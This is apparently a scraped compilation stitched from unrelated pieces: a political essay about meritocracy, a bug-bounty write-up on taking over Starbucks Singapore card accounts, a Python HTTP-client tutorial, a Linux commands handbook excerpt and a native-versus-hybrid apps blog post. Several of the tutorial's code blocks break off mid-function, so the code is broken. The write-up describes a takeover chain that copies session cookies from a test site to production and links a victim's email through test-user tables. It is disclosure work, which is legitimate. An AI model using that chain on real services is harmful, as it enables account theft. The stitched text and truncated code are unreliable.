<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<h3 id="recon"><strong>Recon</strong></h3>
<p>While browsing Starbucks Singapore, I noticed a page loaded with content from a 3rd party site. Let’s call this site <em>example.com</em> in order not to disclose it. When I did some research on this site, I saw the same login page on <em>card.starbucks.com.sg</em> in the directory example.com/starbucks, and at this point I had two possibilities.</p>
<ol>
<li>This application can be an environment where current developments of <em>card.starbucks.com.sg</em> are made and tested.</li>
<li>Or it may have been used as an old test environment and is in an idle state.</li>
</ol>
<p>Both possibilities increased the probability of a bug here, but the main problem is that I did not know whether a bug I will find here would affect the production environment. To understand this, I created a user account at card.starbucks.com.sg and tried to log into example.com/starbucks with this account. BINGO! I was able to successfully login with the account I just created. Both applications seemed to be using the same authentication mechanism.</p>
<p><img src="http://www.kamilonurozkaleli.com/images/starbucks-1.png" alt="Scheme-1, both applications are using same database table."></p>
<h3 id="exploitation"><strong>Exploitation</strong></h3>
<p>From this point I browsed example.com/starbucks and discovered an endpoint which does not exist in the production app. The POST data this endpoint received was as follows.</p>
<p><code>email=hacker@hacker.com</code></p>
<p>When I write the email address of the account I want to takeover in the email parameter here and send a request, I saw the partial information of the account belonging to that email address on my profile page. I could not fully takeover the account yet, and my password change request was not successful due to the invalid CSRF token generated in this application.</p>
<p>To get around this, I copied the PHPSESSID cookie value from example.com/starbucks to card.starbucks.com.sg and BOOM! I was able to see all the information belongs to victim in the production environment, the valid CSRF tokens generated here allowed me to change the password and I was able to completely takeover an account whose e-mail address I know.</p>
<h3 id="impact"><strong>Impact</strong></h3>
<p>Except for seeing all personal information belonging to users and completely taking over the accounts, if there is a loaded credit in the user account, these credits can be spent in Starbucks stores via the mobile application.</p>
<h3 id="multiplying-the-reward"><strong>Multiplying the Reward</strong></h3>
<p>I came across two other test environments on example.com. Let’s call them <em>example.com/starbucks2</em> and <em>example.com/starbucks3</em>. With my account at card.starbucks.com.sg, I was not able to login to either test environment. example.com/starbucks2 did not allow me to create a new account, so I tried my luck at example.com/starbucks3 and successfully created a new account. Things get a little complicated here, I will try to explain it as simply as possible.</p>
<p>I think the applications example.com/starbucks2 and example.com/starbucks3 were using test tables, so users in production could not login in these applications.</p>
<p>With the account I created at example.com/starbucks3, I was able to log in to example.com/starbucks2, but not card.starbucks.com.sg. However, the PHPSESSID I copied from example.com/starbucks2 was valid on card.starbucks.com.sg and I could use that account. Considering all the scenarios, I created a chain here as follows:</p>
<ol>
<li>Create a dummy account with the victim’s email address at example.com/starbucks3. (Add to testusers table.)</li>
<li>At example.com/starbucks2, associate the account for that email with your own account via the same endpoint. (Associate the PHPSESSID with the email in the testusers table.)</li>
<li>Copy the PHPSESSID to card.starbucks.com.sg and takeover. (Takeover the real account of the same email address in the production users table.)</li>
</ol>

<![CDATA[Httpy – Let's build a (nano) HTTP client]]>

November 4, 2020 | https://mhasbini.com/blog/lets-build-an-http-client.html | <a href="https://web.archive.org/web/*/https://mhasbini.com/blog/lets-build-an-http-client.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<h2>What?</h2>

<p>
  Continuing with the same theme as the previous post (<a href="https://mhasbini.com/blog/lets-build-a-web-framework.html" target="_blank">Let's build a (nano) web framework</a>), in this post we'll be bulding a nano http client similar to <a href="https://github.com/urllib3/urllib3" target="_blank">urllib3</a>.
</p>


<h2>Introducing httpy</h2>

<p>
  The http client will be built using Python. Here's the usage we're aiming to get:
</p>

    <pre><code><span>import</span> httpy

req <span>=</span> httpy<span>.</span>get<span>(</span><span>'http://httpbin.org/robots.txt'</span><span>)</span>

req<span>.</span>status 
req<span>.</span>data </code></pre>


<p>
    To achieve this, we need to build:

    </p><ol>
        <li><b>URL parser</b>: This will allow us to get from the string <code>http://httpbin.org/robots.txt</code> to know what the scheme, host &amp; path are.</li>
        <li><b>Communication function</b>: This will send the HTTP request and get the raw response.</li>
        <li><b>HTTP response parser</b>: This will allow us to parse the raw HTTP response to get the response status and the page content.</li>
    </ol>

<h3>How deep are we gonna go?</h3>

<p>
  We're going to basing our work on Python's <a href="https://docs.python.org/3/library/socket.html" target="_blank"><code>socket</code></a> and <a href="https://github.com/pyparsing/pyparsing/" target="_blank">pyparsing</a> libraries.
</p>

<h3>Compromises</h3>

<p>
  As this is experiment is to get an mvp, these are the compromises for this library:
</p>

<ul>
    <li>Only work with HTTP</li>
    <li>URL's format is only a subset.</li>
    <li>Only IPV4</li>
</ul>

<h2>URL parser</h2>

<p>
    The usage will be:

    </p><pre><code><span>try</span><span>:</span>
    host<span>,</span> port<span>,</span> path <span>=</span> parse_url<span>(</span><span>'http://httpbin.org/robots.txt'</span><span>)</span>
<span>except</span> ValueError <span>as</span> e<span>:</span>
    <span>print</span><span>(</span>e<span>)</span>
    exit<span>(</span><span>)</span></code></pre>



<p>
    Let's start by having a couple of test cases. I'm going to use <a href="https://docs.python.org/3/library/doctest.html" target="_blank">doctest</a> for the examples.

    </p><pre><code><span>def</span> <span>parse_url</span><span>(</span>url<span>)</span><span>:</span>
    <span>"""Pase url based on this format:

    http://host[:port]path[?query][#fragment]

    &gt;&gt;&gt; parse_url('http://httpbin.org/')
    ('httpbin.org', 80, '/')
    &gt;&gt;&gt; parse_url('http://httpbin.org/robots.txt')
    ('httpbin.org', 80, '/robots.txt')
    &gt;&gt;&gt; parse_url('http://test:1234/lorem?a=b#c')
    ('test', 1234, '/lorem?a=b')
    &gt;&gt;&gt; parse_url('https://mhasbini.com/')
    Traceback (most recent call last):
        ...
    ValueError: Invalid URL
    &gt;&gt;&gt; parse_url('httpmhasbini.com')
    Traceback (most recent call last):
        ...
    ValueError: Invalid URL
    """</span>

    <span>return</span> <span>""</span></code></pre>



<p>
    We can define a context-free grammar to parse the url based on the specified format.

    I opted to use <a href="https://github.com/pyparsing/pyparsing/" target="_blank">pyparsing</a> to achieve this.

    The grammar is as follow:

    </p><pre><code><span>import</span> pyparsing <span>as</span> pp

host_pp <span>=</span> pp<span>.</span>Word<span>(</span>pp<span>.</span>alphanums <span>+</span> <span>'.'</span> <span>+</span> pp<span>.</span>alphas<span>)</span><span>.</span>setResultsName<span>(</span><span>'host'</span><span>)</span>
port_pp <span>=</span> pp<span>.</span>pyparsing_common<span>.</span>signed_integer<span>.</span>setResultsName<span>(</span><span>'port'</span><span>)</span>
path_pp <span>=</span> pp<span>.</span>Combine<span>(</span><span>'/'</span> <span>+</span> pp<span>.</span>Optional<span>(</span>pp<span>.</span>Word<span>(</span>pp<span>.</span>srange<span>(</span><span>"[a-zA-Z0-9.-_~!$&amp;'()*+,;=:@]"</span><span>)</span><span>)</span><span>)</span><span>)</span><span>.</span>setResultsName<span>(</span><span>'path'</span><span>)</span>
fragment_pp <span>=</span> pp<span>.</span>Optional<span>(</span><span>'#'</span> <span>+</span> pp<span>.</span>Word<span>(</span>pp<span>.</span>srange<span>(</span><span>"[a-zA-Z0-9/?"</span><span>)</span><span>)</span><span>)</span><span>.</span>setResultsName<span>(</span><span>'fragment'</span><span>)</span></code></pre>



<p>
    This is a simple implementation that only supports http and don't adhear completely to the syntax specified in <a href="https://tools.ietf.org/html/rfc3986" target="_blank">rfc3986</a> but is good enough for our mvp.
</p>

<p>
    What's left is to compine these two parts while capturing parsing exceptions and returing the values in the correct format:

    </p><pre><code><span>import</span> pyparsing <span>as</span> pp

<span>def</span> <span>parse_url</span><span>(</span>url<span>)</span><span>:</span>
    <span>"""Pase url based on this format:

    http://[host[:port]]path[?query][#fragment]

    &gt;&gt;&gt; parse_url('http://httpbin.org/')
    ('httpbin.org', 80, '/')
    &gt;&gt;&gt; parse_url('http://httpbin.org/robots.txt')
    ('httpbin.org', 80, '/robots.txt')
    &gt;&gt;&gt; parse_url('http://test:1234/lorem?a=b#c')
    ('test', 1234, '/lorem?a=b')
    &gt;&gt;&gt; parse_url('https://mhasbini.com/')
    Traceback (most recent call last):
        ...
    ValueError: Invalid URL
    &gt;&gt;&gt; parse_url('httpmhasbini.com')
    Traceback (most recent call last):
        ...
    ValueError: Invalid URL

<h2>Communication function</h2>

<p>
    This is the main part of the library, the usage will be:

    </p><pre><code><span>try</span><span>:</span>
    raw_response <span>=</span> get<span>(</span>host<span>,</span> port<span>,</span> path<span>)</span>
<span>except</span> ConnectionError <span>as</span> e<span>:</span>
    <span>print</span><span>(</span>e<span>)</span>
    exit<span>(</span><span>)</span></code></pre>



<p>
    As usual, we start with defining a couple of test cases:

    </p><pre><code><span>def</span> <span>get</span><span>(</span>host<span>,</span> port<span>,</span> path<span>)</span><span>:</span>
    <span>"""Open connection and send GET HTTP request and return raw response

    &gt;&gt;&gt; get('httpbin.org', 80, '/robots.txt') # doctest:+ELLIPSIS
    'HTTP/1.1 200 OK\\r\\nDate: ...\\r\\nContent-Type: text/plain\\r\\nContent-Length: 30\\r\\nConnection: close\\r\\nServer: gunicorn/19.9.0\\r\\nAccess-Control-Allow-Origin: *\\r\\nAccess-Control-Allow-Credentials: true\\r\\n\\r\\nUser-agent: *\\nDisallow: /deny\\n'
    &gt;&gt;&gt; get('mhasbini.com', 1234, '/robots.txt')
    Traceback (most recent call last):
        ...
    tt2.ConnectionError: [Errno 113] No route to host
    """</span>

    <span>.</span><span>.</span><span>.</span></code></pre>



<p>
    To execute this logic, we need to:
    </p><ol>
        <li>Construct the request hearder.</li>
        <li>Open socket and send the request: We'll use <code>socket.AF_INET</code> family because we're only supporting ipv4 and <code>code.SOCK_STREAM</code> type because we're using TCP.</li>
        <li>Read the response a chunk at a time and then return it.</li>
    </ol>



<p>
    Putting the above requirements into code:

    </p><pre><code><span>import</span> socket

<h2>HTTP response parser</h2>

<p>
    This is the final step where we take the raw response from the function above and parse it to get the status code and the response body. The API is as follow:
</p>

    <pre><code>status<span>,</span> body <span>=</span> parse_response<span>(</span>response<span>)</span></code></pre>


<p>Example of responses:</p>

    <pre><code><span>HTTP/1.1 <span>200 OK</span></span>
 Thu, 05 Nov 2020 00:05:19 GMT
 text/plain
 30
 close
 gunicorn/19.9.0
 *
 true

 *
 /deny</code></pre>


    <pre><code><span>HTTP/1.1 <span>404 NOT FOUND</span></span>
 Thu, 05 Nov 2020 00:05:46 GMT
 text/html
 233
 close
 gunicorn/19.9.0
 *
 true<span>

<span>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
<span><span><span>&lt;</span>title</span><span>&gt;</span></span>404 Not Found<span><span><span>&lt;/</span>title</span><span>&gt;</span></span>
<span><span><span>&lt;</span>h1</span><span>&gt;</span></span>Not Found<span><span><span>&lt;/</span>h1</span><span>&gt;</span></span>
<span><span><span>&lt;</span>p</span><span>&gt;</span></span>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.<span><span><span>&lt;/</span>p</span><span>&gt;</span></span></span></code></pre>



<p>
    We start by defining test cases:
</p>

    <pre><code><span>def</span> <span>parse_response</span><span>(</span>raw_response<span>)</span><span>:</span>
    <span>"""Parse raw http response and return status code and body.

    &gt;&gt;&gt; parse_response('HTTP/1.1 200 OK\\r\\nDate: Thu, 05 Nov 2020 03:22:48 GMT\\r\\nContent-Type: text/plain\\r\\nContent-Length: 30\\r\\nConnection: close\\r\\nServer: gunicorn/19.9.0\\r\\nAccess-Control-Allow-Origin: *\\r\\nAccess-Control-Allow-Credentials: true\\r\\n\\r\\nUser-agent: *\\nDisallow: /deny\\n')
    (200, 'User-agent: *\\nDisallow: /deny')
    &gt;&gt;&gt; parse_response('lorem ipsum')
    Traceback (most recent call last):
        ...
    ValueError: Invalid raw response
    """</span>

    <span>.</span><span>.</span><span>.</span></code></pre>


<p>
    The headers and the body are seperated by <code>\r\n\r\n</code> so we parse it as follow:
</p>

    <pre><code>DELIMITER <span>=</span> <span>'\\r\\n\\r\\n'</span>

status_pp <span>=</span> pp<span>.</span>pyparsing_common<span>.</span>signed_integer<span>.</span>setResultsName<span>(</span><span>'status'</span><span>)</span>
body_pp <span>=</span> pp<span>.</span>Suppress<span>(</span>DELIMITER<span>)</span> <span>+</span> pp<span>.</span>Regex<span>(</span><span>r'(.*?)$'</span><span>)</span><span>.</span>setResultsName<span>(</span><span>'body'</span><span>)</span>

<p>
    Putting it together:
</p>

    <pre><code><span>import</span> pyparsing <span>as</span> pp

<span>def</span> <span>parse_response</span><span>(</span>raw_response<span>)</span><span>:</span>
    <span>"""Parse raw http response and return status code and body.

<h2>Plugging everything together</h2>

<p>
    This is the final step where we plug everything together and some syntactic sugar.
</p>


<b>httpy.py</b>

    <pre><code><span>from</span> parsers <span>import</span> parse_url<span>,</span> parse_response
<span>from</span> request_helper <span>import</span> get <span>as</span> raw_get

<p>The Linux Commands Handbook follows the 80/20 rule: you’ll learn 80% of a topic in around 20% of the time you spend studying it.</p>
<p>I find that this approach gives you a well-rounded overview.</p>
<p>This handbook does not try to cover everything under the sun related to Linux and its commands. It focuses on the small core commands that you will use the 80% or 90% of the time, and tries to simplify the usage of the more complex ones.</p>
<p>All these commands work on Linux, macOS, WSL, and anywhere you have a UNIX environment.</p>
<p>I hope the contents of this handbook will help you achieve what you want: <strong>getting comfortable with Linux</strong>.</p>

<p>Enjoy!</p>

<h2 id="summary">Summary</h2>

<h2 id="introductiontolinuxandshells">Introduction to Linux and shells</h2>
<h3 id="whatislinux">What is Linux?</h3>
<p>Linux is an operating system, like macOS or Windows.</p>
<p>It is also the most popular Open Source operating system, and it gives you a lot of freedom.</p>
<p>It powers the vast majority of the servers that compose the Internet. It’s the base upon which everything is built. But not just that. Android is based on (a modified version of) Linux.</p>
<p>The Linux “core” (called a <em>kernel</em>) was born in 1991 in Finland, and it has come a really long way from its humble beginnings. It went on to be the kernel of the GNU Operating System, creating the duo GNU/Linux.</p>
<p>There’s one thing about Linux that corporations like Microsoft, Apple, and Google will never be able to offer: the freedom to do whatever you want with your computer.</p>
<p>They’re actually going in the opposite direction, building walled gardens, especially on the mobile side.</p>
<p>Linux is the ultimate freedom.</p>
<p>It is developed by volunteers, some paid by companies that rely on it, some independently. But there’s no single commercial company that can dictate what goes into Linux, or the project’s priorities.</p>
<p>You can also use Linux as your day to day computer. I use macOS because I really enjoy the applications and design (and I also used to be an iOS and Mac apps developer). But before using macOS I used Linux as my main computer Operating System.</p>
<p>No one can dictate which apps you can run, or “call home” with apps that track you, your position, and more.</p>
<p>Linux is also special because there’s not just “one Linux”, like is the case with Windows or macOS. Instead, we have <strong>distributions</strong>.</p>
<p>A “distro” is made by a company or organization and packages the Linux core with additional programs and tooling.</p>
<p>For example you have Debian, Red Hat, and Ubuntu, probably the most popular distributions.</p>
<p>But many, many more exist. You can create your own distribution, too. But most likely you’ll use a popular one that has lots of users and a community of people around it. This lets you do what you need to do without losing too much time reinventing the wheel and figuring out answers to common problems.</p>
<p>Some desktop computers and laptops ship with Linux preinstalled. Or you can install it on your Windows-based computer, or on a Mac.</p>
<p>But you don’t need to disrupt your existing computer just to get an idea of how Linux works.</p>
<p>I don’t have a Linux computer.</p>
<p>If you use a Mac, you just need to know that under the hood macOS is a UNIX Operating System. It shares a lot of the same ideas and software that a GNU/Linux system uses, because GNU/Linux is a free alternative to UNIX.</p>
<blockquote>
<p><a target="_blank" href="https://en.wikipedia.org/wiki/Unix" rel="noopener noreferrer">UNIX</a> is an umbrella term that groups many operating systems used in big corporations and institutions, starting from the 70’s</p>
</blockquote>
<p>The macOS terminal gives you access to the same exact commands I’ll describe in the rest of this handbook.</p>
<p>Microsoft has an official <a target="_blank" href="https://docs.microsoft.com/en-us/windows/wsl/install-win10" rel="noopener noreferrer">Windows Subsystem for Linux</a> which you can (and should!) install on Windows. This will give you the ability to run Linux in a very easy way on your PC.</p>
<p>But the vast majority of the time you will run a Linux computer in the cloud via a VPS (Virtual Private Server) like DigitalOcean.</p>
<h3 id="whatisashell">What is a shell?</h3>
<p>A shell is a command interpreter that exposes an interface to the user to work with the underlying operating system.</p>
<p>It allows you to execute operations using text and commands, and it provides users advanced features like being able to create scripts.</p>
<p>This is important: shells let you perform things in a more optimized way than a GUI (Graphical User Interface) could ever possibly let you do. Command line tools can offer many different configuration options without being too complex to use.</p>
<p>There are many different kind of shells. This post focuses on Unix shells, the ones that you will find commonly on Linux and macOS computers.</p>
<p>Many different kind of shells were created for those systems over time, and a few of them dominate the space: Bash, Csh, Zsh, Fish and many more!</p>
<p>All shells originate from the Bourne Shell, called <code>sh</code>. “Bourne” because its creator was Steve Bourne.</p>
<p>Bash means <em>Bourne-again shell</em>. <code>sh</code> was proprietary and not open source, and Bash was created in 1989 to create a free alternative for the GNU project and the Free Software Foundation. Since projects had to pay to use the Bourne shell, Bash became very popular.</p>
<p>If you use a Mac, try opening your Mac terminal. By default it runs ZSH (or, pre-Catalina, Bash).</p>
<p>You can set up your system to run any kind of shell – for example I use the Fish shell.</p>
<p>Each single shell has its own unique features and advanced usage, but they all share a common functionality: they can let you execute programs, and they can be programmed.</p>
<p>In the rest of this handbook we’ll see in detail the most common commands you will use.</p>

<h2 id="the-man-command">The <code>man</code> command</h2>
<p>The first command I’ll introduce will help you understand all the other commands.</p>
<p>Every time I don’t know how to use a command, I type <code>man &lt;command&gt;</code> to get the manual:</p>

<p>This is a man (from <em>_manual_</em>) page. Man pages are an essential tool to learn as a developer. They contain so much information that sometimes it’s almost too much.<br>The above screenshot is just 1 of 14 screens of explanation for the <code>ls</code> command.</p>
<p>Most of the time when I need to learn a command quickly I use this site called <strong>tldr pages</strong>: <a target="_blank" href="https://tldr.sh/" rel="noopener noreferrer">https://tldr.sh</a>. It’s a command you can install, which you then run like this: <code>tldr &lt;command&gt;</code>. It gives you a very quick overview of a command, with some handy examples of common usage scenarios:</p>

<p>This is not a substitute for <code>man</code>, but a handy tool to avoid losing yourself in the huge amount of information present in a <code>man</code> page. Then you can use the <code>man</code> page to explore all the different options and parameters you can use on a command.</p>
<h2 id="the-ls-command">The <code>ls</code> command</h2>

<p>Inside a folder you can list all the files that the folder contains using the <code>ls</code> command:</p>
<pre><code>ls
</code></pre>
<p>If you add a folder name or path, it will print that folder’s contents:</p>
<pre><code>ls /bin
</code></pre>
<p><img src="https://i2.wp.com/www.freecodecamp.org/news/content/images/2020/10/Screenshot-2019-02-09-at-18.50.14.png?ssl=1" alt="Screenshot-2019-02-09-at-18.50.14" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/www.freecodecamp.org/news/content/images/2020/10/Screenshot-2019-02-09-at-18.50.14.png?ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><code>ls</code> accepts a lot of options. One of my favorite combinations is <code>-al</code>. Try it:</p>
<pre><code>ls -al /bin
</code></pre>
<p><img src="https://i0.wp.com/www.freecodecamp.org/news/content/images/2020/10/Screenshot-2019-02-09-at-18.49.52.png?ssl=1" alt="Screenshot-2019-02-09-at-18.49.52" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/www.freecodecamp.org/news/content/images/2020/10/Screenshot-2019-02-09-at-18.49.52.png?ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Compared to the plain <code>ls</code> command, this returns much more information.</p>
<p>You have, from left to right:</p>
<ul>
<li>the file permissions (and if your system supports ACLs, you get an ACL flag as well)</li>
<li>the number of links to that file</li>
<li>the owner of the file</li>
<li>the group of the file</li>
<li>the file size in bytes</li>
<li>the file’s last modified datetime</li>
<li>the file name</li>
</ul>
<p>This set of data is generated by the <code>l</code> option. The <code>a</code> option instead also shows the hidden files.</p>
<p>Hidden files are files that start with a dot (<code>.</code>).</p>

<h2 id="thecdcommand">The <code>cd</code> command</h2>
<p>Once you have a folder, you can move into it using the <code>cd</code> command. <code>cd</code> means <strong>c</strong>hange <strong>d</strong>irectory. You invoke it specifying a folder to move into. You can specify a folder name, or an entire path.</p>
<p>Example:</p>
<pre><code>mkdir fruits
cd fruits
</code></pre>
<p>Now you are in the <code>fruits</code> folder.</p>
<p>You can use the <code>..</code> special path to indicate the parent folder:</p>
<pre><code>cd .. #back to the home folder
</code></pre>
<p>The # character indicates the start of the comment, which lasts for the entire line after it’s found.</p>
<p>You can use it to form a path:</p>
<pre><code>mkdir fruits
mkdir cars
cd fruits
cd ../cars
</code></pre>
<p>There is another special path indicator which is <code>.</code>, and indicates the <strong>current</strong> folder.</p>
<p>You can also use absolute paths, which start from the root folder <code>/</code>:</p>
<pre><code>cd /etc
</code></pre>

<h2 id="the-pwd-command">The <code>pwd</code> command</h2>

<p>Whenever you feel lost in the filesystem, call the <code>pwd</code> command to know where you are:</p>
<pre><code>pwd
</code></pre>
<p>It will print the current folder path.</p>

<h2 id="the-mkdir-command">The <code>mkdir</code> command</h2>

<p>You create folders using the <code>mkdir</code> command:</p>
<pre><code>mkdir fruits
</code></pre>
<p>You can create multiple folders with one command:</p>
<pre><code>mkdir dogs cars
</code></pre>
<p>You can also create multiple nested folders by adding the <code>-p</code> option:</p>
<pre><code>mkdir -p fruits/apples
</code></pre>
<p>Options in UNIX commands commonly take this form. You add them right after the command name, and they change how the command behaves. You can often combine multiple options, too.</p>
<p>You can find which options a command supports by typing <code>man &lt;commandname&gt;</code>. Try now with <code>man mkdir</code> for example (press the <code>q</code> key to esc the man page). Man pages are the amazing built-in help for UNIX.</p>

<h2 id="the-rmdir-command">The <code>rmdir</code> command</h2>

<p>Just as you can create a folder using <code>mkdir</code>, you can delete a folder using <code>rmdir</code>:</p>
<pre><code>mkdir fruits
rmdir fruits
</code></pre>
<p>You can also delete multiple folders at once:</p>
<pre><code>mkdir fruits cars
rmdir fruits cars
</code></pre>
<p>The folder you delete must be empty.</p>
<p>To delete folders with files in them, we’ll use the more generic <code>rm</code> command which deletes files and folders, using the <code>-rf</code> option:</p>
<pre><code>rm -rf fruits cars
</code></pre>
<p>Be careful as this command does not ask for confirmation and it will immediately remove anything you ask it to remove.</p>
<p>There is no <strong>bin</strong> when removing files from the command line, and recovering lost files can be hard.</p>

<h2 id="the-mv-command">The <code>mv</code> command</h2>

<p>Once you have a file, you can move it around using the <code>mv</code> command. You specify the file current path, and its new path:</p>
<pre><code>touch test
mv pear new_pear
</code></pre>
<p>The <code>pear</code> file is now moved to <code>new_pear</code>. This is how you <strong>rename</strong> files and folders.</p>
<p>If the last parameter is a folder, the file located at the first parameter path is going to be moved into that folder. In this case, you can specify a list of files and they will all be moved in the folder path identified by the last parameter:</p>
<pre><code>touch pear
touch apple
mkdir fruits
mv pear apple fruits #pear and apple moved to the fruits folder
</code></pre>

<h2 id="the-cp-command">The <code>cp</code> command</h2>

<p>You can copy a file using the <code>cp</code> command:</p>
<pre><code>touch test
cp apple another_apple
</code></pre>
<p>To copy folders you need to add the <code>-r</code> option to …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>If you’re thinking of developing an app, and you’ve consulted the internet on it, you’ve most probably noticed that these two terminologies pop up a lot — Native and Hybrid. What do they mean? How are they different? Which would be better for the nature of your business?</p>
<!--more--><p>Let’s tackle all these burning questions today.&nbsp;</p>
<p>This is how we’ll do it: We’ll define the terms, distinguish them, and then study which piece fits into your priorities and business goals better.&nbsp;</p>
<h2><strong>Understanding What They Are</strong></h2>
<p>Before getting into the nitty gritty, let’s lay down a quick overview of these terminologies.&nbsp;</p>
<h3><strong>Native Apps</strong></h3>
<p>As long as you have a basic understanding of apps, you’d know that smartphones run on either iOS or Android platforms, right? Easy. Basically, native applications are developed specifically for a particular mobile operating system using a software development kit like Java for Android, and Objective-C or Swift for iOS.</p>
<p>The end result of a native app often “feels right” because users have the ability to interact with features in the mobile device’s operating system like GPS, camera, microphone, contact list etc. Given its mature ecosystem, native apps definitely have the advantage of faster performance compared to hybrid apps. Being consistent and similar with other native apps, users will generally learn to navigate your app faster.</p>
<p>At least 80% of the apps on your smartphone are built on native development kits. Take Instagram or your favourite mobile game for an example — these apps that depend on HD graphics and smooth user experience definitely perform better as native apps.</p>
<h3><strong>Hybrid Apps</strong></h3>
<p>Hybrid apps, on the other hands, are basically web apps within an app. They’re built with Javascript, HTML, and CSS and run in a simplified browser (or, webview) on what looks and feels like a native app.&nbsp;</p>
<p>Hybrid apps are typically easier and require less time to develop, compared to native apps. They also require less maintenance and are easier to scale. Most companies opt for hybrid development because they can get the app to market fast, as the apps can be built on a single codebase and released onto multiple platforms quick and easy.</p>
<p><span><strong>Defining Your Goals</strong></span></p>
<p>When it comes to deciding which route to take, there are no cookie cutter, one-size-fits-all answers. There are a few things you will need to consider to weigh your odds — user experience, time to market, app performance, and maintenance. Your personal preferences for these factors make the compass that will point you to the right direction.</p>

<span><img src="https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=600&amp;name=user%20experience.jpg" alt="user experience" width="600" srcset="https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=300&amp;name=user%20experience.jpg 300w, https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=600&amp;name=user%20experience.jpg 600w, https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=900&amp;name=user%20experience.jpg 900w, https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=1200&amp;name=user%20experience.jpg 1200w, https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=1500&amp;name=user%20experience.jpg 1500w, https://blog.snappymob.com/hs-fs/hubfs/user%20experience.jpg?width=1800&amp;name=user%20experience.jpg 1800w" sizes="(max-width: 600px) 100vw, 600px"></span>

<h3><strong>User Experience</strong></h3>
<p>User experience has always been the top factor of an app’s success in user retention. In this millennial age, smartphones have become very personal devices for everyone. We carry them everywhere we go, from the moment we get out of bed to the moment right before we get back into bed. Having a responsive and reliable device that allows us to easily obtain the information we need at any time is one of the reasons why it’s so important to us.</p>
<p><a href="https://buildfire.com/app-statistics/#:~:text=Even%20though%20the%20average%20person,t%20get%20used%20every%20month."><span>Buildfire’s statistics</span></a> on mobile usage indicates that, even though the average person uses 25 apps per month, 96% of the time spent on their devices is split across only 10 apps. What is the reason? Yes, you know it. People are downloading apps, but they’re not using them. As a matter of fact, 75% of apps are used only once after being downloaded, and then within the snap of a finger — users churn.</p>
<p>So, let's link it back to why choosing the technology you build your app on is crucial. Psychologically, users' needs are pretty simple. They buy a new device, spend some time learning to navigate, learn about its features, and they’re done. They don’t want to have to solve a new maze everytime they download a new app.&nbsp;</p>
<p>So with that in mind, the important question to ask yourself before building an app is this: How do I make my app easy to navigate and avoid having users feel like they’re in a maze? The answer is simple — by creating a seamless experience with the platform’s extensive style guide from controls to visuals.</p>
<p>Since native apps are developed for and to be consistent with the ecosystem within the specific operating systems, you can rest assured that user experience won’t be compromised.</p>
<p>Hybrid however, is a risk for user experience, even with the most brilliant UX designs. The difference in style guidelines on hybrid apps could interfere with the success of your application.</p>
<h3><strong>Time To Market</strong></h3>
<p>If time is a major concern, then hybrid apps might be the best solution for you. If you have 6 months or more to spare, however, opt for native solutions.&nbsp;</p>
<p>If your goal right now is to get your product to market as quickly as possible, and you’re willing to sacrifice performance and user experience, go hybrid. Hybrid apps have a shorter development time as the app is built on a single source code and can be released onto multiple platforms.</p>
<p>It’s also a good idea to start with hybrid if you’re testing the viability of your project. After seeing positive feedback, perhaps you can confidently switch to native to penetrate a bigger market.&nbsp;</p>

<h3><strong>App Performance</strong></h3>
